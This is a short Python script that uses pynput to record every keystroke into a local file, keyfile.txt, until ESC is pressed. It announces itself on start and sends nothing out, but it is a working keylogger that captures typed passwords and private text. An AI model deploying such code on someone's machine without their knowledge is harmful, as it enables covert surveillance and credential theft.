# -*- coding: utf-8 -*-

from pynput import keyboard
import os

def on_press_log(key):
    try:
        with open("keyfile.txt", 'a', encoding="utf-8") as logkey:
            if hasattr(key, 'char') and key.char:
                logkey.write(key.char)
            elif key == keyboard.Key.enter:
                logkey.write(f"[{key}]\n")
            elif key == keyboard.Key.backspace:
                logkey.write(f"[{key}]")
            elif key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.shift or key == keyboard.Key.esc:
                logkey.write('')
            else:
                logkey.write(f"[{key}]")
    
    except AttributeError as attributeError:
        print(f"Error logging {key.char}: {attributeError}")
        
    if key == keyboard.Key.esc:
        return False



def main():
    print("Starting key listener. Press 'ESC' to stop.")
    with keyboard.Listener(on_press=on_press_log) as listener:
        listener.join()
        
if __name__ == "__main__":
    main()